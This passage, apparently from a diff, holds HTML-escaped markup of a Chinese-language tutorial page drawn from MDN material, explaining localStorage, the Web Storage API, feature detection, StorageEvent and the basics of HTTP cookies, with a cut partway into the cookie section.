-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;myCat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;Tom&amp;#39;&lt;/span&gt;);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该语法用于读取 &lt;code&gt;localStorage&lt;/code&gt; 项，如下:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;let&lt;/span&gt; cat = localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;myCat&amp;#39;&lt;/span&gt;);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该语法用于移除 &lt;code&gt;localStorage&lt;/code&gt; 项，如下:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;localStorage.removeItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;myCat&amp;#39;&lt;/span&gt;);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该语法用于移除所有的 &lt;code&gt;localStorage&lt;/code&gt; 项，如下:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 移除所有
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;localStorage.clear();
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用-web-storage-api&#34;&gt;使用 Web Storage API&lt;/h1&gt;
-&lt;p&gt;Web Storage API 提供了存储机制，通过该机制，浏览器可以安全地存储键值对，比使用 cookie 更加直观&lt;/p&gt;
-&lt;h2 id=&#34;基本概念&#34;&gt;基本概念&lt;/h2&gt;
-&lt;p&gt;存储对象是简单的键值存储，类似于对象，但是它们在页面加载时保持完整。键和值始终是字符串（请注意，与对象一样，整数键将自动转换为字符串）。您可以像访问对象一样访问这些值，或者使用  &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem&#34;&gt;&lt;code&gt;Storage.getItem()&lt;/code&gt;&lt;/a&gt; 和  &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem&#34;&gt;&lt;code&gt;Storage.setItem()&lt;/code&gt;&lt;/a&gt; 方法 。这三行都设置了（相同的）colorSetting条目：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;localStorage.colorSetting = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;#a4509b&amp;#39;&lt;/span&gt;;
-localStorage[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;colorSetting&amp;#39;&lt;/span&gt;] = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;#a4509b&amp;#39;&lt;/span&gt;;
-localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;colorSetting&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;#a4509b&amp;#39;&lt;/span&gt;);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Web Storage 包含如下两种机制：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;sessionStorage&lt;/code&gt; 为每一个给定的源（given origin）维持一个独立的存储区域，该存储区域在页面会话期间可用（即只要浏览器处于打开状态，包括页面重新加载和恢复）。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;localStorage&lt;/code&gt; 同样的功能，但是在浏览器关闭，然后重新打开后数据仍然存在。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;这两种机制是通过 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage&#34;&gt;&lt;code&gt;Window.sessionStorage&lt;/code&gt;&lt;/a&gt; 和 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage&#34;&gt;&lt;code&gt;Window.localStorage&lt;/code&gt;&lt;/a&gt; 属性使用（更确切的说，在支持的浏览器中 &lt;code&gt;Window&lt;/code&gt; 对象实现了 &lt;code&gt;WindowLocalStorage&lt;/code&gt;和 &lt;code&gt;WindowSessionStorage&lt;/code&gt; 对象并挂在其 &lt;code&gt;localStorage&lt;/code&gt; 和 &lt;code&gt;sessionStorage&lt;/code&gt; 属性下）—— 调用其中任一对象会创建 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象，通过 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象，可以设置、获取和移除数据项。对于每个源（origin）&lt;code&gt;sessionStorage&lt;/code&gt; 和 &lt;code&gt;localStorage&lt;/code&gt; 使用不同的 Storage 对象——独立运行和控制。&lt;/p&gt;
-&lt;p&gt;例如，在文档中调用 &lt;code&gt;localStorage&lt;/code&gt; 将会返回一个 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象；调用 &lt;code&gt;sessionStorage&lt;/code&gt; 返回一个不同的 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象。可以使用相同的方式操作这些对象，但是操作是独立的。&lt;/p&gt;
-&lt;h2 id=&#34;localstorage-功能检测&#34;&gt;localStorage 功能检测&lt;/h2&gt;
-&lt;p&gt;为了能够使用 localStorage，我们应该首先验证它是否在当前浏览会话中受支持并可用。&lt;/p&gt;
-&lt;h3 id=&#34;测试可用性&#34;&gt;测试可用性&lt;/h3&gt;
-&lt;p&gt;支持 localStorage 的浏览器将在窗口对象上具有一个名为 localStorage 的属性。但是，仅断言该属性存在可能会引发异常。如果 localStorage 确实存在，则仍然不能保证 localStorage 实际可用，因为各种浏览器都提供了禁用 localStorage 的设置。因此，浏览器可能支持localStorage，但不适用于页面上的脚本。&lt;/p&gt;
-&lt;p&gt;例如，私有浏览模式下的 Safari 浏览器为我们提供了一个空的l ocalStorage 对象，其配额为零，实际上使它无法使用。相反，我们可能会收到合法的 QuotaExceededError，这意味着我们已经用完了所有可用的存储空间，但实际上存储空间可用。我们的功能检测应考虑这些情况。&lt;/p&gt;
-&lt;p&gt;这是一个检测 localStorage 是否同时受支持和可用的函数：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; storageAvailable(type) {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; storage;
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
-        storage = &lt;span style=&#34;color:#658b00&#34;&gt;window&lt;/span&gt;[type];
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; x = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;__storage_test__&amp;#39;&lt;/span&gt;;
-        storage.setItem(x, x);
-        storage.removeItem(x);
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;true&lt;/span&gt;;
-    }
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt;(e) {
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; e &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;instanceof&lt;/span&gt; DOMException &amp;amp;&amp;amp; (
-            &lt;span style=&#34;color:#228b22&#34;&gt;// everything except Firefox
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            e.code === &lt;span style=&#34;color:#b452cd&#34;&gt;22&lt;/span&gt; ||
-            &lt;span style=&#34;color:#228b22&#34;&gt;// Firefox
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            e.code === &lt;span style=&#34;color:#b452cd&#34;&gt;1014&lt;/span&gt; ||
-            &lt;span style=&#34;color:#228b22&#34;&gt;// test name field too, because code might not be present
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#228b22&#34;&gt;// everything except Firefox
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            e.name === &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;QuotaExceededError&amp;#39;&lt;/span&gt; ||
-            &lt;span style=&#34;color:#228b22&#34;&gt;// Firefox
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            e.name === &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;NS_ERROR_DOM_QUOTA_REACHED&amp;#39;&lt;/span&gt;) &amp;amp;&amp;amp;
-            &lt;span style=&#34;color:#228b22&#34;&gt;// acknowledge QuotaExceededError only if there&amp;#39;s something already stored
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            (storage &amp;amp;&amp;amp; storage.length !== &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;);
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是您将如何使用它：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (storageAvailable(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;localStorage&amp;#39;&lt;/span&gt;)) {
-  &lt;span style=&#34;color:#228b22&#34;&gt;// Yippee! We can use localStorage awesomeness
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
-&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
-  &lt;span style=&#34;color:#228b22&#34;&gt;// Too bad, no localStorage for us
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;您可以通过调用 &lt;code&gt;storageAvailable(&#39;sessionStorage&#39;)&lt;/code&gt; 来测试 sessionStorage。&lt;/p&gt;
-&lt;p&gt;请参阅此处，&lt;a href=&#34;https://gist.github.com/paulirish/5558557&#34;&gt;brief history of feature-detecting localStorage&lt;/a&gt;.。&lt;/p&gt;
-&lt;h2 id=&#34;一个简单的示例&#34;&gt;一个简单的示例&lt;/h2&gt;
-&lt;p&gt;为了展示 Web Storage 的用法，我们创建了一个简单的示例，假设称为 &lt;strong&gt;Web Storage Demo&lt;/strong&gt;。&lt;a href=&#34;https://mdn.github.io/dom-examples/web-storage/&#34;&gt;示例页面&lt;/a&gt;提供了控制表单，用于自定义颜色、字体和装饰图片：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://mdn.mozillademos.org/files/9685/landing.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
-&lt;p&gt;当你选择不同的选项后，页面会立即更新；除此之外，你的选择会被存到 &lt;code&gt;localStorage&lt;/code&gt; 里，这样，当你关闭页面之后重新加载时，你的选择会被记住。&lt;/p&gt;
-&lt;p&gt;我们还提供了一个&lt;a href=&#34;https://mdn.github.io/dom-examples/web-storage/event.html&#34;&gt;存储事件结果页面&lt;/a&gt; — 如果你在另一个标签页加载该页面，然后改变之前示例页面的选项，则随着 &lt;code&gt;StorageEvent&lt;/code&gt; 事件的触发，更新的存储信息会显示出来。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://mdn.mozillademos.org/files/9687/event-output.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;备注：&lt;/strong&gt; 除了使用上面的链接查看示例页面外，还可以&lt;a href=&#34;https://github.com/mdn/dom-examples/tree/master/web-storage&#34;&gt;获取源码&lt;/a&gt;。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;测试本地存储是否已被填充&#34;&gt;测试本地存储是否已被填充&lt;/h3&gt;
-&lt;p&gt;在 &lt;a href=&#34;https://github.com/mdn/dom-examples/blob/master/web-storage/main.js&#34;&gt;main.js&lt;/a&gt; 开头，我们先测试本地存储是否已被填充（即，页面之前被访问过）：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(!localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;)) {
-  populateStorage();
-} &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
-  setStyles();
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem&#34;&gt;&lt;code&gt;Storage.getItem()&lt;/code&gt;&lt;/a&gt; 方法用来从存储中获取一个数据项。该例中，我们测试 &lt;code&gt;bgcolor&lt;/code&gt; 数据项是否存在。如果不存在，执行 &lt;code&gt;populateStorage()&lt;/code&gt; 来将存在的自定义值添加到存储中。如果有值存在，则执行 &lt;code&gt;setStyles()&lt;/code&gt; 来使用存储的值更新页面的样式。&lt;/p&gt;
-&lt;p&gt;**备注：**你还可以使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/length&#34;&gt;&lt;code&gt;Storage.length&lt;/code&gt;&lt;/a&gt; 来测试存储对象是否为空。&lt;/p&gt;
-&lt;h3 id=&#34;从存储中获取值&#34;&gt;从存储中获取值&lt;/h3&gt;
-&lt;p&gt;正如上面提到的，使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem&#34;&gt;&lt;code&gt;Storage.getItem()&lt;/code&gt;&lt;/a&gt; 可以从存储中获取一个数据项。该方法接受数据项的键作为参数，并返回数据值。例如：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; setStyles() {
-  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; currentColor = localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;);
-  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; currentFont = localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;font&amp;#39;&lt;/span&gt;);
-  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; currentImage = localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;);
-
-  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;).value = currentColor;
-  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;font&amp;#39;&lt;/span&gt;).value = currentFont;
-  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;).value = currentImage;
-
-  htmlElem.style.backgroundColor = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;#&amp;#39;&lt;/span&gt; + currentColor;
-  pElem.style.fontFamily = currentFont;
-  imgElem.setAttribute(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;src&amp;#39;&lt;/span&gt;, currentImage);
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;首先，前三行代码从本地中获取值。接着，将值显示到表单元素中，这样在重新加载页面时与自定义设置保持同步。最后，更新页面的样式和图片，这样重新加载页面后，你的自定义设置重新起作用了。&lt;/p&gt;
-&lt;h3 id=&#34;在存储中设置值&#34;&gt;在存储中设置值&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem&#34;&gt;&lt;code&gt;Storage.setItem()&lt;/code&gt;&lt;/a&gt; 方法可被用来创建新数据项和更新已存在的值。该方法接受两个参数——要创建/修改的数据项的键，和对应的值。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; populateStorage() {
-  localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;).value);
-  localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;font&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;font&amp;#39;&lt;/span&gt;).value);
-  localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;).value);
-
-  setStyles();
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;populateStorage()&lt;/code&gt; 方法在本地存储中设置三项数据 — 背景颜色、字体和图片路径。然后执行 &lt;code&gt;setStyles()&lt;/code&gt; 方法来更新页面的样式。&lt;/p&gt;
-&lt;p&gt;同时，我们为每个表单元素绑定了一个 &lt;code&gt;onchange&lt;/code&gt; 监听器，这样，一个表单值改变时，存储的数据和页面样式会更新。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;bgcolorForm.onchange = populateStorage;
-fontForm.onchange = populateStorage;
-imageForm.onchange = populateStorage;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;通过-storageevent-响应存储的变化&#34;&gt;通过 StorageEvent 响应存储的变化&lt;/h3&gt;
-&lt;p&gt;无论何时，&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象发生变化时（即创建/更新/删除数据项时，重复设置相同的键值不会触发该事件，&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/clear&#34;&gt;&lt;code&gt;Storage.clear()&lt;/code&gt;&lt;/a&gt; 方法至多触发一次该事件），&lt;code&gt;StorageEvent&lt;/code&gt; 事件会触发。在同一个页面内发生的改变不会起作用——在相同域名下的其他页面（如一个新标签或 iframe）发生的改变才会起作用。在其他域名下的页面不能访问相同的 Storage 对象。&lt;/p&gt;
-&lt;p&gt;在事件结果页面中的 JavaScript 如下所示（可见 &lt;a href=&#34;https://github.com/mdn/dom-examples/blob/master/web-storage/event.js&#34;&gt;events.js&lt;/a&gt;）：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#658b00&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;storage&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt;(e) {  
-  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-key&amp;#39;&lt;/span&gt;).textContent = e.key;
-  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-old&amp;#39;&lt;/span&gt;).textContent = e.oldValue;
-  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-new&amp;#39;&lt;/span&gt;).textContent = e.newValue;
-  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-url&amp;#39;&lt;/span&gt;).textContent = e.url;
-  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-storage&amp;#39;&lt;/span&gt;).textContent = e.storageArea;
-});
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里，我们为 window 对象添加了一个事件监听器，在当前域名相关的 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象发生改变时该事件监听器会触发。正如你在上面看到的，此事件相关的事件对象有多个属性包含了有用的信息——改变的数据项的键，改变前的旧值，改变后的新值，改变的存储对象所在的文档的 URL，以及存储对象本身。&lt;/p&gt;
-&lt;h3 id=&#34;删除数据记录&#34;&gt;删除数据记录&lt;/h3&gt;
-&lt;p&gt;Web Storage 提供了一对简单的方法用于移除数据。我们没用在我们的 demo 中使用这些方法，但是添加到你自己的项目中很简单：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/removeItem&#34;&gt;&lt;code&gt;Storage.removeItem()&lt;/code&gt;&lt;/a&gt; 接受一个参数——你想要移除的数据项的键，然后会将对应的数据项从域名对应的存储对象中移除。&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/clear&#34;&gt;&lt;code&gt;Storage.clear()&lt;/code&gt;&lt;/a&gt; 不接受参数，只是简单地清空域名对应的整个存储对象。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h1 id=&#34;http-cookies&#34;&gt;HTTP cookies&lt;/h1&gt;
-&lt;p&gt;HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless&#34;&gt;无状态&lt;/a&gt;的HTTP协议记录稳定的状态信息成为了可能。&lt;/p&gt;
-&lt;p&gt;Cookie 主要用于以下三个方面：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）&lt;/li&gt;
-&lt;li&gt;个性化设置（如用户自定义设置、主题等）&lt;/li&gt;
-&lt;li&gt;浏览器行为跟踪（如跟踪分析用户行为等）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API&#34;&gt;Web storage API&lt;/a&gt; （本地存储和会话存储）或 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API&#34;&gt;IndexedDB&lt;/a&gt; 。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;要查看Cookie存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用&lt;strong&gt;存储查看&lt;/strong&gt;（&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector&#34;&gt;Storage Inspector&lt;/a&gt; ）功能，并在存储树上选中&lt;strong&gt;Cookie&lt;/strong&gt;。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://www.openheart.icu/image/Cookie-20200725121428491.png&#34; alt=&#34;image-20200725121428491&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;创建cookie&#34;&gt;创建Cookie&lt;/h2&gt;
-&lt;p&gt;当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 &lt;code&gt;{{HTTPHeader(&amp;quot;Set-Cookie&amp;quot;)}}&lt;/code&gt;选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 &lt;code&gt;{{HTTPHeader(&amp;quot;Cookie&amp;quot;)}} &lt;/code&gt;请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。&lt;/p&gt;
-&lt;h3 id=&#34;set-cookie响应头部和cookie请求头部&#34;&gt;&lt;code&gt;Set-Cookie响应头部&lt;/code&gt;和&lt;code&gt;Cookie请求头部&lt;/code&gt;&lt;/h3&gt;
-&lt;p&gt;服务器使用 &lt;code&gt;{{HTTPHeader(&amp;quot;Set-Cookie&amp;quot;)}} &lt;/code&gt;响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Set-Cookie: &amp;lt;cookie名&amp;gt;=&amp;lt;cookie值&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;服务器通过该头部告知客户端保存 Cookie 信息。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;HTTP/1.0 200 OK
-Content-type: text/html
-Set-Cookie: yummy_cookie=choco
-Set-Cookie: tasty_cookie=strawberry
-
-[页面内容]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过{{HTTPHeader(&amp;ldquo;Cookie&amp;rdquo;)}}请求头部再发送给服务器。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;GET /sample_page.html HTTP/1.1
-Host: www.example.org
-Cookie: yummy_cookie=choco; tasty_cookie=strawberry
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;提示:&lt;/strong&gt; 如何在以下几种服务端程序中设置 &lt;code&gt;Set-Cookie&lt;/code&gt; 响应头信息 :&lt;/p&gt;
-&lt;ul&gt;
